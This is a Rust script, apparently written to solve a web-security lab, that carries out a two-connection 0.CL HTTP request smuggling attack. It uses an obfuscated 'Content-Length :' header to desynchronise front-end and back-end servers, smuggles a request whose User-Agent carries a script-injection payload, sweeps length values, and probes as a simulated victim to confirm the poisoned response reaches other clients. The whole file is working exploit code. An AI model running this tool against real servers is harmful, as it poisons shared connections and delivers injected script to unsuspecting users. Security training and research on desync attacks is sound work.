#!/usr/bin/env rust-script
//! name: zecl0
//! description: 0.CL two-connection desync driver (Kettle "HTTP/1.1 Must Die" byte form) - connection A carries the primer `GET <gadget> HTTP/1.1` + `Content-Length : N` (space before colon: hidden to the front-end, honoured by the back-end) with no body; the front-end ignores it, forwards a bodyless request, and the back-end is left waiting for N body bytes on a pooled upstream connection. Connection B is then opened immediately and carries B = chopped + revealed + smuggled, where chopped is the byte-exact prefix the back-end discards (the fused header form), revealed is a complete canary request (labHeader.js) and smuggled is the XSS request (GET /post?postId=N with a poisoned User-Agent). The back-end discards N bytes then parses revealed + smuggled as fresh requests, producing surplus responses; the driver reports per-N which responses came back, whether the canary JS body landed, and optionally probes like the victim. `--p1-mode complete` swaps chopped for a full request (offset scan form).
//! version: 1.0.0
//! args: <base-url> [--gadget PATH] [--bust] [--cl N] [--cl-from N] [--cl-to N] [--cl-step N] [--p1-mode chopped|complete] [--p1-path P] [--p1-cl N] [--canary PATH] [--post-id N] [--ua S] [--body-len N] [--gap-ms N] [--rounds N] [--warm] [--sim-victim] [--victim-path P] [--victim-delay-ms N] [--victim-conns N] [--victim-read-ms N] [--read-ms N] [--host H] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, poisoning, xss, delivery, two-connection, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

/// Split a byte buffer into response segments on status lines and classify each.
fn summarize(buf: &[u8], markers: &[(&str, &str)]) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    // offsets of status lines: a response's body is followed directly by the next
    // status line, so scan for the token anywhere and take its line.
    let mut starts: Vec<(usize, String)> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let line_end = rest.find("\r\n").map(|i| off + i).unwrap_or(text.len());
        let line = rest[..line_end - off].to_string();
        // only accept "HTTP/1.x <digits>" shaped lines
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            starts.push((off, line));
        }
    }
    let mut segs: Vec<Value> = Vec::new();
    for i in 0..starts.len() {
        let (off, status) = &starts[i];
        let end = if i + 1 < starts.len() { starts[i + 1].0 } else { text.len() };
        let seg = &text[*off..end];
        let mut hits = pi_rust_lib::serde_json::Map::new();
        for (name, needle) in markers {
            hits.insert((*name).to_string(), json!(seg.matches(needle).count()));
        }
        segs.push(json!({
            "status": status,
            "len": seg.len(),
            "hits": hits,
            "head": seg.chars().take(90).collect::<String>(),
        }));
    }
    json!({
        "bytes": buf.len(),
        "count": starts.len(),
        "statuses": starts.iter().map(|(_, s)| s.clone()).collect::<Vec<_>>(),
        "segments": segs,
    })
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn has(argv: &[String], key: &str) -> bool {
    argv.iter().any(|a| a == key)
}

fn victim_probe(host: &str, port: u16, path: &str, markers: &[(&str, &str)], conns: u64, read_ms: u64) -> (u64, Vec<Value>) {
    let mut hits = 0u64;
    let mut vs: Vec<Value> = Vec::new();
    for _ in 0..conns {
        timeout::check();
        let vr = (|| -> Result<Value, String> {
            let mut c = connect(host, port)?;
            let req = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n");
            c.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
            let _ = c.flush();
            let b = drain(&mut c, read_ms, 400);
            Ok(summarize(&b, markers))
        })();
        match vr {
            Ok(v) => {
                let hit = v["segments"]
                    .as_array()
                    .map(|a| a.iter().any(|x| x["hits"]["xss"].as_u64().unwrap_or(0) > 0))
                    .unwrap_or(false);
                if hit {
                    hits += 1;
                }
                vs.push(v);
            }
            Err(e) => vs.push(json!({"error": e})),
        }
    }
    (hits, vs)
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if has(&argv, "--selftest") {
        let buf = b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabcHTTP/1.1 404 Not Found\r\nContent-Length: 18\r\n\r\nzzz completedListeners";
        let s = summarize(buf, &[("canary", "completedListeners"), ("xss", "alert(")]);
        let ok = s["count"] == 2 && s["segments"][1]["hits"]["canary"] == 1;
        pi_rust_lib::report::success(
            "zecl0",
            json!({"selftest": if ok {"ok"} else {"fail"}, "count": s["count"], "second": s["segments"][1]["hits"]}),
            "response splitter + marker classifier is the pure root",
        )
        .unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "zecl0",
            "usage",
            "call as: zecl0 <base-url> [--cl 56] [--cl-from 40 --cl-to 80 --cl-step 1] [--p1-mode chopped|complete] [--sim-victim]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);

    let gadget = arg_val(&argv, "--gadget").unwrap_or_else(|| "/resources/images/blog.svg".to_string());
    let bust = has(&argv, "--bust");
    let p1_mode = arg_val(&argv, "--p1-mode").unwrap_or_else(|| "chopped".to_string());
    let p1_path = arg_val(&argv, "--p1-path").unwrap_or_else(|| "/?Whatever=Iwant".to_string());
    let p1_cl_arg: Option<u64> = arg_val(&argv, "--p1-cl").and_then(|v| if v == "auto" { None } else { v.parse().ok() });
    let same_conn = has(&argv, "--same-conn");
    let canary = arg_val(&argv, "--canary").unwrap_or_else(|| "/resources/labheader/js/labHeader.js".to_string());
    let post_id = arg_val(&argv, "--post-id").unwrap_or_else(|| "2".to_string());
    let ua = arg_val(&argv, "--ua").unwrap_or_else(|| "XXX\"><script>alert()</script>\"XXX".to_string());
    let body_len: usize = arg_val(&argv, "--body-len").and_then(|v| v.parse().ok()).unwrap_or(25);
    let decl_cl_arg: Option<usize> = arg_val(&argv, "--decl-cl").and_then(|v| v.parse().ok());
    let gap_ms: u64 = arg_val(&argv, "--gap-ms").and_then(|v| v.parse().ok()).unwrap_or(0);
    let rounds: u64 = arg_val(&argv, "--rounds").and_then(|v| v.parse().ok()).unwrap_or(1);
    let read_ms: u64 = arg_val(&argv, "--read-ms").and_then(|v| v.parse().ok()).unwrap_or(2000);
    let warm = has(&argv, "--warm");
    let sim_victim = has(&argv, "--sim-victim");
    let victim_path = arg_val(&argv, "--victim-path").unwrap_or_else(|| "/".to_string());
    let victim_delay_ms: u64 = arg_val(&argv, "--victim-delay-ms").and_then(|v| v.parse().ok()).unwrap_or(0);
    let victim_conns: u64 = arg_val(&argv, "--victim-conns").and_then(|v| v.parse().ok()).unwrap_or(1);
    let victim_read_ms: u64 = arg_val(&argv, "--victim-read-ms").and_then(|v| v.parse().ok()).unwrap_or(3000);

    let mut ns: Vec<u64> = Vec::new();
    if let Some(v) = arg_val(&argv, "--cl") {
        ns.push(v.parse().unwrap_or(56));
    } else if arg_val(&argv, "--cl-from").is_some() {
        let lo: u64 = arg_val(&argv, "--cl-from").unwrap().parse().unwrap_or(40);
        let hi: u64 = arg_val(&argv, "--cl-to").unwrap_or_else(|| lo.to_string()).parse().unwrap_or(lo);
        let step: u64 = arg_val(&argv, "--cl-step").and_then(|v| v.parse().ok()).unwrap_or(1).max(1);
        let mut n = lo;
        while n <= hi {
            ns.push(n);
            n += step;
        }
    } else {
        ns.push(56);
    }

    let mut xss_body = String::from("x=y");
    while xss_body.len() < body_len {
        xss_body.push('A');
    }
    let markers: Vec<(&str, &str)> = vec![
        ("canary", "completedListeners"),
        ("xss", "alert("),
        ("ok", "200 OK"),
        ("bad", "400 Bad Request"),
    ];

    let mut rows: Vec<Value> = Vec::new();
    let mut last_err = String::new();
    let mut canary_rows: u64 = 0;
    let mut xss_rows: u64 = 0;
    let mut victim_hits: u64 = 0;

    if warm {
        if let Ok(mut c) = connect(&host, port) {
            let _ = c.write_all(format!("GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").as_bytes());
            let _ = c.flush();
            let _ = drain(&mut c, 800, 300);
        }
    }

    for round in 0..rounds {
        for (ni, n) in ns.iter().enumerate() {
            timeout::check();
            let mut row = json!({"round": round, "n": n});
            let cb = if bust { format!("?cb=x{:06}", round * 1000 + ni as u64) } else { String::new() };
            let gurl = format!("{gadget}{cb}");
            let attack1 = format!(
                "GET {gurl} HTTP/1.1\r\nHost: {host}\r\nContent-Length : {n}\r\nConnection: keep-alive\r\n\r\n"
            );
            let canary_url = canary.clone();
            let revealed = format!(
                "GET {canary_url} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"
            );
            let decl: usize = decl_cl_arg.unwrap_or(xss_body.len());
            let smuggled = format!(
                "GET /post?postId={post_id} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {decl}\r\n\r\n{xss_body}"
            );
            let p1_cl: u64 = p1_cl_arg.unwrap_or(smuggled.len() as u64);
            let p1 = if p1_mode == "complete" {
                format!("GET {p1_path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n")
            } else {
                format!("GET {p1_path} HTTP/1.1\r\nContent-Length: {p1_cl}\r\nX: Y")
            };
            let attack2 = format!("{p1}{revealed}{smuggled}");
            row["a1_len"] = json!(attack1.len());
            row["p1_len"] = json!(p1.len());
            row["p1_cl"] = json!(p1_cl);
            row["smuggled_len"] = json!(smuggled.len());
            row["a2_len"] = json!(attack2.len());
            row["revealed_len"] = json!(revealed.len());

            if same_conn {
                let mut saw_canary = false;
                match connect(&host, port) {
                    Ok(mut c) => {
                        if c.write_all(attack1.as_bytes()).is_err() {
                            last_err = "attack1 write".to_string();
                        } else {
                            let _ = c.flush();
                            if gap_ms > 0 {
                                std::thread::sleep(Duration::from_millis(gap_ms));
                            }
                            let b1 = drain(&mut c, read_ms, 300);
                            row["a1"] = summarize(&b1, &markers);
                            if c.write_all(attack2.as_bytes()).is_err() {
                                last_err = "attack2 write".to_string();
                            } else {
                                let _ = c.flush();
                                let b2 = drain(&mut c, read_ms, 300);
                                let s2 = summarize(&b2, &markers);
                                if s2["segments"].as_array().map(|a| a.iter().any(|x| x["hits"]["canary"].as_u64().unwrap_or(0) > 0)).unwrap_or(false) {
                                    canary_rows += 1;
                                    saw_canary = true;
                                }
                                if s2["segments"].as_array().map(|a| a.iter().any(|x| x["hits"]["xss"].as_u64().unwrap_or(0) > 0)).unwrap_or(false) {
                                    xss_rows += 1;
                                }
                                row["a2"] = s2;
                            }
                        }
                    }
                    Err(e) => last_err = e,
                }
                if sim_victim && saw_canary {
                    if victim_delay_ms > 0 {
                        std::thread::sleep(Duration::from_millis(victim_delay_ms));
                    }
                    let (h, vs) = victim_probe(&host, port, &victim_path, &markers, victim_conns, victim_read_ms);
                    victim_hits += h;
                    row["victim"] = json!(vs);
                }
                rows.push(row);
                continue;
            }

            // connection A: primer, fire and forget
            let c1 = match connect(&host, port) {
                Ok(s) => s,
                Err(e) => {
                    last_err = e;
                    break;
                }
            };
            let mut c1 = c1;
            if c1.write_all(attack1.as_bytes()).is_err() {
                last_err = "attack1 write".to_string();
                break;
            }
            let _ = c1.flush();
            if gap_ms > 0 {
                std::thread::sleep(Duration::from_millis(gap_ms));
            }
            // connection B: immediately after A
            match connect(&host, port) {
                Ok(mut c2) => {
                    if c2.write_all(attack2.as_bytes()).is_err() {
                        last_err = "attack2 write".to_string();
                    } else {
                        let _ = c2.flush();
                        let b2 = drain(&mut c2, read_ms, 300);
                        let s2 = summarize(&b2, &markers);
                        if s2["segments"]
                            .as_array()
                            .map(|a| a.iter().any(|x| x["hits"]["canary"].as_u64().unwrap_or(0) > 0))
                            .unwrap_or(false)
                        {
                            canary_rows += 1;
                        }
                        if s2["segments"]
                            .as_array()
                            .map(|a| a.iter().any(|x| x["hits"]["xss"].as_u64().unwrap_or(0) > 0))
                            .unwrap_or(false)
                        {
                            xss_rows += 1;
                        }
                        row["a2"] = s2;
                    }
                    let _ = c2.write_all(b"");
                }
                Err(e) => last_err = e,
            }
            let b1 = drain(&mut c1, 600, 200);
            row["a1"] = summarize(&b1, &markers);
            drop(c1);

            if sim_victim {
                if victim_delay_ms > 0 {
                    std::thread::sleep(Duration::from_millis(victim_delay_ms));
                }
                let (h, vs) = victim_probe(&host, port, &victim_path, &markers, victim_conns, victim_read_ms);
                victim_hits += h;
                row["victim"] = json!(vs);
            }
            rows.push(row);
        }
    }

    let mut banner = Value::Null;
    if has(&argv, "--banner") {
        if let Ok(mut c) = connect(&host, port) {
            let req = format!("GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
            let _ = c.write_all(req.as_bytes());
            let _ = c.flush();
            let b = drain(&mut c, 4000, 500);
            let t = String::from_utf8_lossy(&b).to_string();
            banner = json!({
                "is_solved": t.contains("is-solved"),
                "congrats": t.contains("Congratulations") || t.contains("congratulations"),
                "not_solved": t.contains("is-notsolved"),
                "bytes": b.len(),
            });
        }
    }

    pi_rust_lib::report::success(
        "zecl0",
        json!({
            "url": base,
            "host": host,
            "gadget": gadget,
            "bust": bust,
            "p1_mode": p1_mode,
            "cl_values": ns,
            "canary_rows": canary_rows,
            "xss_rows": xss_rows,
            "victim_hits": victim_hits,
            "banner": banner,
            "rows": rows,
            "last_error": last_err,
        }),
        "canary_rows>0 proves the 0.CL split aligned (back-end parsed our revealed request); victim_hits>0 proves the XSS page reached a client",
    )
    .unwrap_or(());
}
